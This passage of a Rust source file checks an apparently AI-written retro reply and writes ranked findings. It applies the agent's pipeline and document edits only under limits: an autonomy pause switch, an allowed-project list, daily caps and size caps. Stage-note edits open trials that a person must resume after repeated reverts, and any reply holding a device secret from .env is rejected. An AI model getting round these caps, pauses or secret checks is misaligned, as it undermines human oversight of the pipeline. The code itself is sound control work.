    a.len() - start - end + b.len() - start - end
}

type Violation = Option<(Option<&'static str>, String)>;

/// The first violation of one retro edit as (field, problem), or None. field is None for the whole edit.
/// An edit with a file key edits a project file.
fn check_edit(e: &Value, agg: &Value) -> Violation {
    if py_in(&json!("file"), e) {
        return check_doc_edit(e, agg);
    }
    if let Some(err) = check_keys(e, &["scope", "stage", "note", "summary"], &[]) {
        return Some((None, err));
    }
    let empty = json!({});
    let pipeline = agg.get("pipeline").unwrap_or(&empty);
    let Some(scope) = e["scope"].as_str().filter(|s| pipeline.get(*s).is_some()) else {
        return Some((Some("scope"), "must be a scope in aggregate.json".into()));
    };
    let stage = e["stage"].as_str().filter(|s| RETRO_STAGES.contains(s));
    let checks = [
        (
            "stage",
            stage
                .is_none()
                .then(|| format!("must be one of {}", RETRO_STAGES.join(", "))),
        ),
        ("note", check_text(&e["note"], 1, 2000, true)),
        ("summary", check_text(&e["summary"], 1, 120, false)),
    ];
    if let Some((at, err)) = checks
        .into_iter()
        .find_map(|(at, err)| err.map(|err| (at, err)))
    {
        return Some((Some(at), err));
    }
    let old = pipeline[scope]["stage_notes"]
        .get(stage.unwrap())
        .and_then(Value::as_str)
        .unwrap_or("");
    if changed_chars(old, e["note"].as_str().unwrap()) > RETRO_EDIT_CHANGE {
        return Some((
            Some("note"),
            format!("changes more than {RETRO_EDIT_CHANGE} characters"),
        ));
    }
    None
}

/// The first violation of one retro file edit as (field, problem), or None. field is None for the whole edit.
fn check_doc_edit(e: &Value, agg: &Value) -> Violation {
    if let Some(err) = check_keys(e, &["file", "find", "replace", "summary"], &[]) {
        return Some((None, err));
    }
    let empty = json!({});
    let documents = agg.get("documents").unwrap_or(&empty);
    let Some(file) = e["file"].as_str().filter(|f| documents.get(*f).is_some()) else {
        return Some((Some("file"), "must be a file in aggregate.json".into()));
    };
    let checks = [
        ("find", check_text(&e["find"], 1, 600, true)),
        ("replace", check_text(&e["replace"], 0, 600, true)),
        ("summary", check_text(&e["summary"], 1, 120, false)),
    ];
    if let Some((at, err)) = checks
        .into_iter()
        .find_map(|(at, err)| err.map(|err| (at, err)))
    {
        return Some((Some(at), err));
    }
    let text = documents[file]["text"].as_str().unwrap_or("");
    let (find, replace) = (e["find"].as_str().unwrap(), e["replace"].as_str().unwrap());
    let start = text.find(find);
    let again =
        start.is_some_and(|s| text[s + find.chars().next().unwrap().len_utf8()..].contains(find));
    let Some(start) = start.filter(|_| !again) else {
        return Some((
            Some("find"),
            "must match the stored text exactly once".into(),
        ));
    };
    let next = format!("{}{replace}{}", &text[..start], &text[start + find.len()..]);
    if changed_chars(text, &next) > RETRO_EDIT_CHANGE {
        return Some((
            Some("find"),
            format!("changes more than {RETRO_EDIT_CHANGE} characters"),
        ));
    }
    None
}

fn now_micros() -> i128 {
    SystemTime::now()
        .duration_since(UNIX_EPOCH)
        .unwrap_or_default()
        .as_micros() as i128
}

/// How many retro versions the history at route has from the last 24 hours. Only retro saves carry run.
fn edits_today(home: &Path, route: &str) -> Res<usize> {
    let r = api(home, "GET", route, None, &[200, 404], &[])?;
    let cutoff = now_micros() - 24 * 3600 * 1_000_000;
    let versions = if r.status == 200 {
        json_of(&r.text()?)?
    } else {
        json!([])
    };
    let mut n = 0;
    for v in py_iter(&versions)? {
        if !py_in(&json!("run"), &v) {
            continue;
        }
        let saved = when(v.get("saved_at"))
            .ok_or_else(|| fail(format!("{route}: saved_at is not a time with an offset"), 1))?;
        n += usize::from(saved > cutoff);
    }
    Ok(n)
}

fn trial_valid(t: &Value) -> bool {
    let Some(project) = t
        .get("project")
        .and_then(Value::as_str)
        .filter(|p| SLUG.is_full(p))
    else {
        return false;
    };
    let (stage, version, champion) = (&t["stage"], &t["version"], &t["champion_version"]);
    stage.as_str().is_some_and(|s| PIPELINE_STAGES.contains(&s))
        && is_int(version)
        && is_int(champion)
        && champion.as_f64().unwrap() >= 0.0
        && t["id"] == json!(format!("{project}-{}-v{}", py_str(stage), py_str(version)))
        && t.get("opened")
            .and_then(Value::as_str)
            .and_then(parse_stamp)
            .is_some()
}

fn trials(data: &Value) -> impl Iterator<Item = &Value> {
    data.get("trials")
        .filter(|t| truthy(Some(*t)))
        .and_then(Value::as_array)
        .into_iter()
        .flatten()
}

/// The board's open, well-formed trial for slug's stage note, if any.
fn open_trial_for(data: &Value, slug: &str, stage: &str) -> bool {
    trials(data).any(|t| {
        trial_valid(t)
            && t["status"] == json!("open")
            && t["project"] == json!(slug)
            && t["stage"] == json!(stage)
    })
}

/// True when slug has TRIAL_PAUSE_REVERTS reverted trials no person resumed.
fn trials_paused(data: &Value, slug: &str) -> bool {
    trials(data)
        .filter(|t| {
            t.is_object()
                && t["project"] == json!(slug)
                && t["status"] == json!("reverted")
                && !truthy(t.get("resumed"))
        })
        .count()
        >= TRIAL_PAUSE_REVERTS
}

/// Append an open trial record for one saved stage-note edit to the board, print its line and return it.
/// champion_version is the version the edit replaced; champion is display text.
fn open_trial(
    home: &Path,
    run: &str,
    e: &Value,
    version: &str,
    champion_version: &Value,
    champion: &Value,
) -> Res<Value> {
    let slug: String = e["scope"]
        .as_str()
        .unwrap()
        .chars()
        .skip("projects/".len())
        .collect();
    let stage = e["stage"].as_str().unwrap();
    let record = json!({"id": format!("{slug}-{stage}-v{version}"), "project": slug, "stage": stage,
                        "version": int_text(version)?, "run": run, "summary": e["summary"],
                        "champion_version": champion_version, "champion": champion, "challenger": e["note"],
                        "opened": now(), "status": "open"});
    cas(home, "/api/board", |text| {
        let mut data = load_board(text)?;
        let trials = data
            .as_object_mut()
            .unwrap()
            .entry("trials")
            .or_insert_with(|| json!([]));
        trials
            .as_array_mut()
            .ok_or_else(|| fail("the board's trials is not a list", 1))?
            .push(record.clone());
        data["updated"] = record["opened"].clone();
        Ok((Some(dump_board(&data)), ()))
    })?;
    println!(
        "trial {} opened: alternate jobs keep the old note until trial settle decides",
        py_str(&record["id"])
    );
    Ok(record)
}

/// `int(text)` for a Worker version header.
fn int_text(text: &str) -> Res<i64> {
    strip(text)
        .parse()
        .map_err(|_| fail(format!("version {text} is not a number"), 1))
}

/// PUT each checked edit to the Worker's retro route while autonomy runs. Returns one
/// {scope, stage, summary, result} row per edit; a bad edit's text is left out. A saved
/// edit moves agg's version and note on, so a later edit to the same scope builds on it.
/// A saved stage-note edit opens a trial, and no stage-note edit is sent while its stage has an
/// open trial or its project's trials are paused.
fn apply_edits(home: &Path, run: &str, edits: &[Value], agg: &mut Value) -> Res<Vec<Value>> {
    let mut board = load_board(Some(
        &api(home, "GET", "/api/board", None, &[200], &[])?.text()?,
    ))?;
    let autonomy = load_autonomy(&board);
    if autonomy["paused"] != json!(false) {
        println!("autonomy is paused; no pipeline edit");
        return Ok((0..edits.len())
            .map(|i| json!({"scope": format!("edits[{i}]"), "stage": "", "result": "not sent: autonomy is paused", "summary": ""}))
            .collect());
    }
    let allowed = |slug: &str| {
        autonomy["projects"]
            .as_array()
            .unwrap()
            .iter()
            .any(|p| p == slug)
    };
    let mut results = Vec::new();
    for (i, e) in edits.iter().enumerate() {
        let skip = |mut row: Value, reason: String| {
            println!("skipped edits[{i}]: {reason}");
            row["result"] = json!(format!("skipped: {reason}"));
            row
        };
        if let Some((field, problem)) = check_edit(e, agg) {
            let at = field.map_or(format!("edits[{i}]"), |f| format!("edits[{i}].{f}"));
            println!("skipped {at}: {problem}");
            results.push(json!({"scope": format!("edits[{i}]"), "stage": "", "result": format!("skipped: {at}: {problem}"), "summary": ""}));
            continue;
        }
        let file = e.get("file").and_then(Value::as_str);
        let row = match file {
            Some(f) => json!({"scope": f, "stage": "", "summary": e["summary"]}),
            None => json!({"scope": e["scope"], "stage": e["stage"], "summary": e["summary"]}),
        };
        let (listed, rule) = match file {
            Some(f) => {
                let slash = f
                    .find('/')
                    .ok_or_else(|| fail(format!("{f} has no /"), 1))?;
                (allowed(&f[..slash]), RETRO_DOC_EDIT_SCOPE)
            }
            None => {
                let scope = e["scope"].as_str().unwrap();
                let slug: String = scope.chars().skip("projects/".len()).collect();
                (scope != "global" && allowed(&slug), RETRO_EDIT_SCOPE)
            }
        };
        if !listed {
            results.push(skip(row, rule.to_string()));
            continue;
        }
        if file.is_none() {
            let slug: String = e["scope"]
                .as_str()
                .unwrap()
                .chars()
                .skip("projects/".len())
                .collect();
            let stage = e["stage"].as_str().unwrap();
            let reason = if trials_paused(&board, &slug) {
                Some(format!(
                    "stage-note trials are paused after {TRIAL_PAUSE_REVERTS} reverts; a person runs trial resume {slug}"
                ))
            } else if open_trial_for(&board, &slug, stage) {
                Some(format!(
                    "a trial is open for {} stage_notes.{stage}",
                    py_str(&e["scope"])
                ))
            } else {
                None
            };
            if let Some(reason) = reason {
                results.push(skip(row, reason));
                continue;
            }
        }
        let today = match file {
            Some(f) => edits_today(home, &format!("/api/project-history/{f}"))?,
            None => edits_today(
                home,
                &format!("/api/pipeline/history/{}", py_str(&e["scope"])),
            )?,
        };
        if today >= RETRO_EDITS_PER_DAY {
            let per = if file.is_some() { "file" } else { "scope" };
            results.push(skip(
                row,
                format!("retro edit cap: {RETRO_EDITS_PER_DAY} per {per} per day"),
            ));
            continue;
        }
        let (body, route) = match file {
            Some(f) => (
                json!({"schema": RETRO_DOC_EDIT_SCHEMA, "run": run, "base_version": agg["documents"][f]["version"],
                       "find": e["find"], "replace": e["replace"], "summary": e["summary"]}),
                format!("/api/project-retro/{f}"),
            ),
            None => {
                let scope = e["scope"].as_str().unwrap();
                (
                    json!({"schema": RETRO_EDIT_SCHEMA, "run": run, "base_version": agg["pipeline"][scope]["version"],
                           "stage": e["stage"], "note": e["note"], "summary": e["summary"]}),
                    format!("/api/pipeline/retro/{scope}"),
                )
            }
        };
        let r = api(
            home,
            "PUT",
            &route,
            Some(dumps(&body, DEFAULT).as_bytes()),
            &[200, 400, 403, 404, 409, 412, 413, 429],
            &[("Content-Type", "application/json")],
        )?;
        if r.status != 200 {
            let reason =
                strip(&format!("{} {}", r.status, printable_line(&r.text()?, 200))).to_string();
            results.push(skip(row, reason));
            continue;
        }
        let summary = py_str(&e["summary"]);
        let version = match file {
            Some(f) => {
                let version = r
                    .header("X-Project-Version")
                    .ok_or_else(|| fail("the Worker sent no X-Project-Version", 1))?;
                let doc = &mut agg["documents"][f];
                let (find, replace) = (e["find"].as_str().unwrap(), e["replace"].as_str().unwrap());
                let text = doc["text"].as_str().unwrap().replacen(find, replace, 1);
                doc["text"] = json!(text);
                doc["version"] = json!(int_text(version)?);
                println!("edited {f} to version {version}: {summary}");
                version
            }
            None => {
                let version = r
                    .header("X-Pipeline-Version")
                    .ok_or_else(|| fail("the Worker sent no X-Pipeline-Version", 1))?;
                let (scope, stage) = (e["scope"].as_str().unwrap(), e["stage"].as_str().unwrap());
                let saved = &mut agg["pipeline"][scope];
                let champion = saved["stage_notes"]
                    .get(stage)
                    .cloned()
                    .unwrap_or(json!(""));
                saved["version"] = json!(int_text(version)?);
                saved["stage_notes"][stage] = e["note"].clone();
                println!("edited {scope} stage_notes.{stage} to version {version}: {summary}");
                let record = open_trial(home, run, e, version, &body["base_version"], &champion)?;
                let trials = board
                    .as_object_mut()
                    .unwrap()
                    .entry("trials")
                    .or_insert_with(|| json!([]));
                trials
                    .as_array_mut()
                    .ok_or_else(|| fail("the board's trials is not a list", 1))?
                    .push(record);
                version
            }
        };
        let mut row = row;
        row["result"] = json!(format!("version {version}"));
        results.push(row);
    }
    Ok(results)
}

/// The rank order of checked findings: score count x cost first, then title.
fn by_score(a: &&Value, b: &&Value) -> std::cmp::Ordering {
    let score = |f: &Value| int_of(f.get("count")) * int_of(f.get("cost"));
    score(b)
        .cmp(&score(a))
        .then_with(|| a["title"].as_str().cmp(&b["title"].as_str()))
}

fn host_sessions(agg: &Value) -> i64 {
    agg["hosts"]
        .as_object()
        .into_iter()
        .flatten()
        .map(|(_, h)| int_of(h.get("sessions")))
        .sum()
}

/// text as a markdown blockquote, one > per line.
fn quote_md(text: &str) -> String {
    text.split('\n')
        .map(|line| {
            if line.is_empty() {
                ">".to_string()
            } else {
                format!("> {line}")
            }
        })
        .collect::<Vec<_>>()
        .join("\n")
}

fn cell(text: &str) -> String {
    text.replace('|', "\\|")
}

type Rejected<'a> = (usize, Option<&'a str>, String);
type Fixed<'a> = (usize, &'a Value, Value, Value);

/// findings.md: the reply's findings ranked by count x cost, built from checked fields only.
/// rejected holds (index, field, problem) for dropped findings, listed without their text.
/// edits holds apply_edits rows. fixed holds (index, finding, job id, merged) for findings a
/// merged job fixed.
fn render_findings(
    agg: &Value,
    run: &str,
    findings: &[&Value],
    rejected: &[Rejected],
    edits: &[Value],
    fixed: &[Fixed],
    cards: &[(usize, String)],
) -> String {
    let mut ranked = findings.to_vec();
    ranked.sort_by(by_score);
    let hosts: BTreeSet<&String> = agg["hosts"]
        .as_object()
        .into_iter()
        .flatten()
        .map(|(h, _)| h)
        .collect();
    let mut window = format!(
        "Window {} to {} · hosts {} · {} sessions · ranked by count x cost",
        py_str(&agg["from"]),
        py_str(&agg["to"]),
        hosts.into_iter().cloned().collect::<Vec<_>>().join(", "),
        host_sessions(agg)
    );
    if !rejected.is_empty() {
        window += &format!(" · {} rejected", rejected.len());
    }
    if !fixed.is_empty() {
        window += &format!(" · {} fixed", fixed.len());
    }
    let mut lines = vec![
        format!("# Retro {run}"),
        String::new(),
        window,
        String::new(),
        "| Rank | Finding | Category | Count | Cost each | Score | Target |".into(),
        "| --- | --- | --- | --- | --- | --- | --- |".into(),
    ];
    for (n, f) in ranked.iter().enumerate() {
        let (count, cost) = (int_of(f.get("count")), int_of(f.get("cost")));
        lines.push(format!(
            "| {} | {} | {} | {} | {} | {} | {} |",
            n + 1,
            cell(&py_str(&f["title"])),
            py_str(&f["category"]),
            commas(count),
            commas(cost),
            commas(count * cost),
            py_str(&f["project"])
        ));
    }
    for (n, f) in ranked.iter().enumerate() {
        let sessions: Vec<String> = f["sessions"]
            .as_array()
            .into_iter()
            .flatten()
            .map(|r| format!("`{}`", py_str(r)))
            .collect();
        lines.extend([
            String::new(),
            format!("## {}. {}", n + 1, py_str(&f["title"])),
            String::new(),
            "Root cause:".into(),
            String::new(),
            quote_md(&py_str(&f["root_cause"])),
            String::new(),
            "Fix:".into(),
            String::new(),
            quote_md(&py_str(&f["fix"])),
            String::new(),
            format!("Sessions: {}", sessions.join(", ")),
        ]);
        if let Some(job) = f.get("fixed_by") {
            lines.extend([
                String::new(),
                format!(
                    "Fixed by: `{}`, but a session started after its merge.",
                    py_str(job)
                ),
            ]);
        }
    }
    let accept: Vec<(&String, &Value)> = agg
        .get("reviewers")
        .and_then(Value::as_object)
        .into_iter()
        .flatten()
        .filter(|(_, s)| s["changes"].as_f64().is_some_and(|n| n > 0.0))
        .collect();
    if !accept.is_empty() {
        lines.extend([
            String::new(),
            "## Reviewer accept rate".into(),
            String::new(),
            "CHANGES findings in jobs merged or closed in the window. Disputed counts findings the builder listed under Disputed findings in build.md; fixed is the rest.".into(),
            String::new(),
            "| Reviewer | CHANGES findings | Fixed | Disputed | Accept rate | Jobs |".into(),
            "| --- | --- | --- | --- | --- | --- |".into(),
        ]);
        for (r, s) in accept {
            lines.push(format!(
                "| {r} | {} | {} | {} | {}% | {} |",
                py_str(&s["changes"]),
                py_str(&s["fixed"]),
                py_str(&s["disputed"]),
                py_str(&s["accept_pct"]),
                py_str(&s["jobs"])
            ));
        }
    }
    if !rejected.is_empty() {
        lines.extend([
            String::new(),
            "## Rejected findings".into(),
            String::new(),
            "Admission dropped these findings. Their text is not shown; read reply.json to see it."
                .into(),
            String::new(),
            "| Finding | Field | Problem |".into(),
            "| --- | --- | --- |".into(),
        ]);
        for (i, field, problem) in rejected {
            lines.push(format!(
                "| {i} | {} | {} |",
                field.unwrap_or("whole finding"),
                cell(problem)
            ));
        }
    }
    if !fixed.is_empty() {
        lines.extend([
            String::new(),
            "## Fixed findings".into(),
            String::new(),
            "A merged job fixed these before every session they cite started.".into(),
            String::new(),
            "| Finding | Title | Fixed by | Merged |".into(),
            "| --- | --- | --- | --- |".into(),
        ]);
        for (i, f, job, at) in fixed {
            lines.push(format!(
                "| {i} | {} | {} | {} |",
                cell(&py_str(&f["title"])),
                cell(&py_str(job)),
                cell(&py_str(at))
            ));
        }
    }
    if !cards.is_empty() {
        lines.extend([
            String::new(),
            "## Rejected cards".into(),
            String::new(),
            "Admission dropped these cards. Their text is not shown; read reply.json to see it."
                .into(),
            String::new(),
            "| Card | Problem |".into(),
            "| --- | --- |".into(),
        ]);
        for (i, problem) in cards {
            lines.push(format!("| {i} | {} |", cell(problem)));
        }
    }
    if !edits.is_empty() {
        lines.extend([
            String::new(),
            "## Pipeline edits".into(),
            String::new(),
            "| Scope | Stage | Result | Summary |".into(),
            "| --- | --- | --- | --- |".into(),
        ]);
        for e in edits {
            lines.push(format!(
                "| {} | {} | {} | {} |",
                py_str(&e["scope"]),
                py_str(&e["stage"]),
                cell(&py_str(&e["result"])),
                cell(&py_str(&e["summary"]))
            ));
        }
    }
    lines.join("\n") + "\n"
}

/// The first violation of one retro finding as (field, problem), or None. field is None for the whole finding.
/// merged holds the aggregate's merged rows, which an optional fixed_by must name.
fn check_finding(f: &Value, projects: &Value, merged: &Value) -> Violation {
    let required = [
        "title",
        "category",
        "count",
        "cost",
        "sessions",
        "root_cause",
        "fix",
        "project",
    ];
    if let Some(err) = check_keys(f, &required, &["fixed_by"]) {
        return Some((None, err));
    }
    let whole =
        |v: &Value, most: f64| is_int(v) && v.as_f64().is_some_and(|n| (1.0..=most).contains(&n));
    let ids: Vec<&Value> = merged
        .as_array()
        .into_iter()
        .flatten()
        .map(|m| &m["id"])
        .collect();
    let checks = [
        ("title", check_text(&f["title"], 1, 80, false)),
        (
            "category",
            (!f["category"]
                .as_str()
                .is_some_and(|c| RETRO_CATEGORIES.contains(&c)))
            .then(|| format!("must be one of {}", RETRO_CATEGORIES.join(", "))),
        ),
        (
            "count",
            (!whole(&f["count"], 10_000_000.0))
                .then(|| "must be a whole number from 1 to 10000000".into()),
        ),
        (
            "cost",
            (!whole(&f["cost"], 1_000_000_000.0))
                .then(|| "must be a whole number from 1 to 1000000000".into()),
        ),
        ("sessions", check_session_refs(&f["sessions"])),
        ("root_cause", check_text(&f["root_cause"], 1, 300, false)),
        ("fix", check_text(&f["fix"], 1, 300, false)),
        (
            "project",
            (!py_in(&f["project"], projects)).then(|| "must be a project in aggregate.json".into()),
        ),
        (
            "fixed_by",
            f.get("fixed_by")
                .is_some_and(|id| !ids.contains(&id))
                .then(|| "must be a job id from merged in aggregate.json".into()),
        ),
    ];
    checks
        .into_iter()
        .find_map(|(at, err)| err.map(|err| (Some(at), err)))
}

/// Each host/session ref in the run's digest.jsonl mapped to its start. A missing or linked file gives none.
fn session_starts(folder: &Path) -> Res<Map<String, Value>> {
    let path = folder.join("digest.jsonl");
    if is_link(&path).map_err(|e| fail(os_error(&e, Some(&path)), 1))? || !path.is_file() {
        return Ok(Map::new());
    }
    let text = read_text(&path).map_err(|e| fail(os_error(&e, Some(&path)), 1))?;
    let mut starts = Map::new();
    for line in splitlines(&text, false) {
        let row = loads(line).map_err(|e| fail(format!("{}: {e}", path.display()), 1))?;
        starts.insert(
            session_ref(&row),
            row.get("start").cloned().unwrap_or(Value::Null),
        );
    }
    Ok(starts)
}

/// (id, merged) of the job in f's fixed_by when every session f cites has a known start before its merge.
fn fixed(f: &Value, merged: &Value, starts: &Map<String, Value>) -> Option<(Value, Value)> {
    let job = f.get("fixed_by")?;
    let m = merged.as_array()?.iter().find(|m| &m["id"] == job)?;
    let at = when(m.get("merged"))?;
    let sessions = f["sessions"].as_array()?;
    let before = sessions
        .iter()
        .all(|r| when(r.as_str().and_then(|r| starts.get(r))).is_some_and(|t| t < at));
    before.then(|| (m["id"].clone(), m["merged"].clone()))
}

/// Every string inside a parsed JSON value.
fn strings(v: &Value) -> Vec<&str> {
    match v {
        Value::String(s) => vec![s],
        Value::Array(items) => items.iter().flat_map(strings).collect(),
        Value::Object(map) => map.values().flat_map(strings).collect(),
        _ => Vec::new(),
    }
}

/// The first key in home/.env whose value, ENV_SECRET_MIN or more characters long, appears in text.
fn env_secret(home: &Path, text: &str) -> Res<Option<String>> {
    let env = home.join(".env");
    if !env.exists() {
        return Ok(None);
    }
    let pairs = read_env_ordered(&env).map_err(|e| fail(os_error(&e, Some(&env)), 1))?;
    Ok(pairs
        .into_iter()
        .find(|(_, v)| v.chars().count() >= ENV_SECRET_MIN && text.contains(v.as_str()))
        .map(|(k, _)| k))
}

/// PUT the run's checked findings and logged cards as a factory.retro-run/1 record. kept holds each reply
/// finding in order, None where admission rejected it or a merged job fixed it; rejected counts the
/// findings that failed checks; links holds each card's finding number or list of numbers. Errors print to
/// stderr and never change the exit code.
#[allow(clippy::too_many_arguments)]
fn upload(
    home: &Path,
    run: &str,
    agg: &Value,
    kept: &[Option<&Value>],
    rejected: usize,
    cards: &[&Value],
    links: &[&Value],
    outcomes: &[(String, String)],
) -> Res<()> {
    let device = config_device(home)?;
    if !HOST_NAME.is_full(&device) {
        eprintln!("retro upload skipped: set device: in config.md");
        return Ok(());
    }
    let mut ranked: Vec<(usize, &Value)> = kept
        .iter()
        .enumerate()
        .filter_map(|(n, f)| f.map(|f| (n + 1, f)))
        .collect();
    ranked.sort_by(|a, b| by_score(&a.1, &b.1));
    let mut findings: Vec<Value> = ranked
        .iter()
        .enumerate()
        .map(|(n, (_, f))| {
            let mut row = Map::new();
            row.insert("rank".into(), json!(n + 1));
            for k in [
                "title",
                "category",
                "count",
                "cost",
                "project",
                "root_cause",
                "fix",
            ] {
                row.insert(k.into(), f[k].clone());
            }
            row.insert("cards".into(), json!([]));
            Value::Object(row)
        })
        .collect();
    let rank_of = |n: i64| {
        ranked
            .iter()
            .position(|(k, _)| *k as i64 == n)
            .map(|r| r + 1)
    };
    let mut loose = Vec::new();
    for (s, link) in cards.iter().zip(links) {
        let fp = fingerprint(&py_str(&s["project"]), s);
        let result = outcomes
            .iter()
            .find(|(f, _)| *f == fp)
            .map_or("not admitted", |(_, r)| r.as_str());
        let row = json!({"title": s["title"], "project": s["project"], "fingerprint": fp,
                         "result": result.chars().take(120).collect::<String>()});
        let nums: Vec<&Value> = match link {
            Value::Array(items) => items.iter().collect(),
            other if is_int(other) => vec![*other],
            _ => Vec::new(),
        };
        let ranks: BTreeSet<usize> = nums
            .iter()
            .filter_map(|n| n.as_i64().and_then(rank_of))
            .collect();
        for rank in &ranks {
            findings[rank - 1]["cards"]
                .as_array_mut()
                .unwrap()
                .push(row.clone());
        }
        if ranks.is_empty() {
            loose.push(row);
        }
    }
    let record = json!({"schema": RETRO_RUN_SCHEMA, "run": run, "host": device, "from": agg["from"], "to": agg["to"],
                        "sessions": host_sessions(agg), "rejected": rejected, "findings": findings, "cards": loose});
    let sent = api(
        home,
        "PUT",
        &format!("/api/retros/{run}"),
        Some(dumps(&record, DEFAULT).as_bytes()),
        &[200, 400, 403, 404, 409, 413],
        &[("Content-Type", "application/json")],
    )
    .and_then(|r| Ok((r.status, r.text()?)));
    match sent {
        Ok((200, _)) => println!("uploaded retro run {run}"),
        Ok((status, text)) => eprintln!(
            "retro upload failed: {status} {}",
            printable_line(&text, 200)
        ),
        Err(e) => eprint!("{}", e.stderr),
    }
    Ok(())
}

/// Check a retro run's reply and write its ranked findings.md. A bad finding is dropped and listed; a
/// finding a merged job fixed is listed apart. A reply with cards waits for the backlog port.
fn admit(home: &Path, run: &str) -> Res<()> {
    let folder = home.join("retro").join(run);
    let (path, agg_path) = (folder.join("reply.json"), folder.join("aggregate.json"));
    let (findings_path, suggestions_path) =
        (folder.join("findings.md"), folder.join("suggestions.json"));
    let link = |p: &Path| is_link(p).map_err(|e| fail(os_error(&e, Some(p)), 1));
    if link(folder.parent().unwrap())? || link(&folder)? || !folder.is_dir() {
        return Err(fail(format!("no retro run {run}"), 4));
    }
    for p in [&path, &agg_path, &findings_path, &suggestions_path] {
        if link(p)? {
            return Err(fail(
                format!("{} is a link; nothing written", p.display()),
                2,
            ));
        }
    }
    if !path.is_file() || !agg_path.is_file() {
        return Err(fail(format!("no retro run {run}"), 4));
    }
    let mut raw = Vec::new();
    File::open(&path)
        .and_then(|f| f.take(MAX_RETRO_BYTES + 1).read_to_end(&mut raw))
        .map_err(|e| fail(os_error(&e, Some(&path)), 1))?;
    if raw.len() as u64 > MAX_RETRO_BYTES {
        return Err(fail(
            format!(
                "{} is larger than {MAX_RETRO_BYTES} bytes; nothing written",
                path.display()
            ),
            2,
        ));
    }
    let doc = String::from_utf8(raw)
        .map_err(|e| e.to_string())
        .and_then(|text| loads(&text).map_err(|e| e.to_string()))
        .map_err(|e| {
            fail(
                format!("{} is not UTF-8 JSON: {e}; nothing written", path.display()),
                2,
            )
        })?;
    if is_none_reply(&doc) {
        return Err(fail("the retro agent found nothing", 3));
    }
    if let Some(key) = env_secret(home, &strings(&doc).join("\n"))? {
        return Err(fail(
            format!(
                "{} holds this device's {key}; nothing written",
                path.display()
            ),
            2,
        ));
    }
    let agg_text = read_text(&agg_path).map_err(|e| fail(os_error(&e, Some(&agg_path)), 1))?;
    let mut agg = loads(&agg_text).map_err(|e| fail(format!("{}: {e}", agg_path.display()), 1))?;
    let err = check_retro(&doc)
        .or_else(|| (doc["run"] != json!(run)).then(|| format!("run: must be {run}")));
    if let Some(err) = err {
        return Err(fail(
            format!("{}: {err}; nothing written", path.display()),
            2,
        ));
    }
    let merged = agg.get("merged").cloned().unwrap_or(json!([]));
    let (mut passed, mut rejected) = (Vec::new(), Vec::new());
    for (i, f) in doc["findings"].as_array().unwrap().iter().enumerate() {
        match check_finding(f, &agg["projects"], &merged) {
            Some((field, problem)) => rejected.push((i, field, problem)),
            None => passed.push((i, f)),
        }
    }
    let lines: Vec<String> = rejected
        .iter()
        .map(|(i, field, problem)| match field {
            Some(field) => format!("findings[{i}].{field}: {problem}"),
            None => format!("findings[{i}]: {problem}"),
        })
        .collect();
    if passed.is_empty() {
        return Err(fail(
            format!("{}: {}; nothing written", path.display(), lines[0]),
            2,
        ));
    }
    let starts = session_starts(&folder)?;
    let fixes: Vec<(usize, &Value, Option<(Value, Value)>)> = passed
        .iter()
        .map(|(i, f)| (*i, *f, fixed(f, &merged, &starts)))
        .collect();
    let kept: Vec<&Value> = fixes
        .iter()
        .filter(|(.., fix)| fix.is_none())
        .map(|(_, f, _)| *f)
        .collect();
    let fixed: Vec<Fixed> = fixes
        .iter()
        .filter_map(|(i, f, fix)| fix.clone().map(|(job, at)| (*i, *f, job, at)))
        .collect();
    let (mut cards_in, mut links) = (Vec::new(), Vec::new());
    for s in doc["suggestions"].as_array().unwrap() {
        let mut s = s.clone();
        let link = s
            .as_object_mut()
            .and_then(|m| m.shift_remove("finding"))
            .unwrap_or(Value::Null);
        cards_in.push(s);
        links.push(link);
    }
    let total = doc["findings"].as_array().unwrap().len();
    let (mut clean, mut bad_cards) = (Vec::new(), Vec::new());
    for (i, (s, link)) in cards_in.iter().zip(&links).enumerate() {
        let err = check_retro_card(s, run, i).or_else(|| {
            check_finding_link(link, total).map(|bad| format!("suggestions[{i}].finding: {bad}"))
        });
        match err {
            Some(err) => bad_cards.push((i, err)),
            None => clean.push((i, s, link)),
        }
    }
    let fixed_by: Vec<(i64, &Value)> = fixed
        .iter()
        .map(|(i, _, job, _)| (*i as i64 + 1, job))
        .collect();
    let fixer = |n: &Value| {
        fixed_by
            .iter()
            .find(|(k, _)| Some(*k) == n.as_i64())
            .map(|(_, j)| *j)
    };
    let mut skipped: Vec<(usize, Value)> = Vec::new();
    for (i, _, link) in &clean {
        let nums: Vec<&Value> = match link {
            Value::Array(items) => items.iter().collect(),
            other => vec![other],
        };
        if nums.iter().all(|n| fixer(n).is_some()) {
            skipped.push((*i, fixer(nums[0]).unwrap().clone()));
        }
    }
    let write = |text: String| {
        write_atomic(&findings_path, text.as_bytes())
            .map_err(|e| fail(os_error(&e, Some(&findings_path)), 1))
    };
    write(render_findings(
        &agg,
        run,
        &kept,
        &rejected,
        &[],
        &fixed,
        &bad_cards,
    ))?;
    println!("wrote {}", findings_path.display());
    for line in &lines {
        println!("rejected {line}");
    }
    for (i, _, job, at) in &fixed {
        println!("fixed findings[{i}]: {} merged {}", py_str(job), py_str(at));
    }
    for (_, err) in &bad_cards {
        println!("rejected {err}");
    }
    for (i, job) in &skipped {
        println!("skipped suggestions[{i}]: finding fixed by {}", py_str(job));
    }
    if truthy(doc.get("edits")) {
        let results = apply_edits(home, run, doc["edits"].as_array().unwrap(), &mut agg)?;
        write(render_findings(
            &agg, run, &kept, &rejected, &results, &fixed, &bad_cards,
        ))?;
    }
    let none = json!([]);
    queue_lessons(home, &agg, doc.get("lesson_cards").unwrap_or(&none))?;
    let reply_findings: Vec<Option<&Value>> = doc["findings"]
        .as_array()
        .unwrap()
        .iter()
        .enumerate()
        .map(|(i, f)| {
            fixes
                .iter()
                .any(|(j, _, fix)| *j == i && fix.is_none())
                .then_some(f)
        })
        .collect();
    let mut outcomes: Vec<(String, String)> = Vec::new();
    let (mut up_cards, mut up_links): (Vec<&Value>, Vec<&Value>) = (Vec::new(), Vec::new());
    let result = (|| -> Res<()> {
        if cards_in.is_empty() {
            println!("no suggestions");
            return Ok(());
        }
        if clean.is_empty() {
            return Err(fail(
                format!(
                    "{}: {}; findings.md written, no cards admitted",
                    path.display(),
                    bad_cards[0].1
                ),
                2,
            ));
        }
        up_cards = clean.iter().map(|(_, s, _)| *s).collect();
        up_links = clean.iter().map(|(_, _, l)| *l).collect();
        for (i, s, _) in &clean {
            if let Some((_, job)) = skipped.iter().find(|(k, _)| k == i) {
                outcomes.push((
                    fingerprint(&py_str(&s["project"]), s),
